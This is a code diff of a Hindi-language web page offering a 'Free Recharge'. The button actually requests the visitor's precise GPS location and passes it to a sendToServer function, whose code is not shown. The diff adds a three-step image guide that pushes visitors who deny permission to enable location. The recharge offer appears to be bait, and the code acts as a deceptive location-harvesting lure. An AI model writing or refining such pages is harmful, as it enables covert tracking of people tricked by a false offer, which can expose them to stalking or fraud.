@@ -117,11 +117,10 @@
       }
 
       .guide-image {
-        margin-top: 20px;
         width: 100%;
         border-radius: 12px;
         box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        display: none;
+        margin-top: 12px;
       }
 
       .loader {
@@ -183,23 +182,22 @@
       <button class="btn" onclick="getLocation()">🎁 Free Recharge</button>
       <div class="loader" id="loader"></div>
       <div class="status" id="status"></div>
-      <img
-        src="direction.jpg"
-        alt="लोकेशन ऑन कैसे करें"
-        class="guide-image"
-        id="guideImage"
-      />
+
+      <!-- New Multi-Step Guide -->
+      <div id="guideSteps" style="display: none; margin-top: 20px">
+        <img src="step1.jpg" alt="स्टेप 1" class="guide-image" />
+        <img src="step2.jpg" alt="स्टेप 2" class="guide-image" />
+        <img src="step3.jpg" alt="स्टेप 3" class="guide-image" />
+      </div>
     </div>
 
     <script>
       function getLocation() {
         const status = document.getElementById("status");
         const loader = document.getElementById("loader");
-        const guideImage = document.getElementById("guideImage");
+        const guideSteps = document.getElementById("guideSteps");
 
-        // Reset previous image visibility
-        guideImage.style.display = "none";
-
+        guideSteps.style.display = "none";
         loader.style.display = "block";
         status.style.color = "green";
         status.textContent =
@@ -212,33 +210,11 @@
           return;
         }
 
-        /*  navigator.geolocation.getCurrentPosition(
-                (position) => {
-                  const latitude = position.coords.latitude;
-                  const longitude = position.coords.longitude;
-
-                  status.textContent =
-                    "🎁 आपका फ्री रिचार्ज प्रोसेस किया जा रहा है...";
-                  sendToServer(latitude, longitude);
-                },
-                (error) => {
-                  loader.style.display = "none";
-                  status.style.color = "red";
-                  status.textContent = "❌ कृपया नीचे दिए गए निर्देशों को फॉलो करें।";
-                  guideImage.style.display = "block";
-                },
-                {
-                  enableHighAccuracy: true,
-                  timeout: 10000,
-                  maximumAge: 0,
-                }
-              );
-            }*/
-
-        //testing
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            const { latitude, longitude } = position.coords;
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
             status.textContent =
               "🎁 आपका फ्री रिचार्ज प्रोसेस किया जा रहा है...";
             sendToServer(latitude, longitude);
@@ -246,35 +222,12 @@
           (error) => {
             loader.style.display = "none";
             status.style.color = "red";
-            guideImage.style.display = "block";
-
-            let message = "❌ अज्ञात त्रुटि हुई। कृपया पुनः प्रयास करें।";
-
-            if (error && typeof error.code !== "undefined") {
-              switch (error.code) {
-                case 1: // PERMISSION_DENIED
-                  message =
-                    "❌ आपने लोकेशन अनुमति नहीं दी। कृपया अनुमति दें।" +
-                    error.code;
-                  break;
-                case 2: // POSITION_UNAVAILABLE
-                  message =
-                    "❌ लोकेशन उपलब्ध नहीं है। कृपया GPS चालू करें।" +
-                    error.code;
-                  break;
-                case 3: // TIMEOUT
-                  message =
-                    "❌ लोकेशन प्राप्त करने में समय समाप्त हो गया।" +
-                    error.code;
-                  break;
-              }
-            }
-
-            status.textContent = message;
+            status.textContent = "❌ कृपया नीचे दिए गए 3 स्टेप्स को फॉलो करें।";
+            guideSteps.style.display = "block";
           },
           {
             enableHighAccuracy: true,
-            timeout: 95000,
+            timeout: 100000,
             maximumAge: 0,
           }
         );
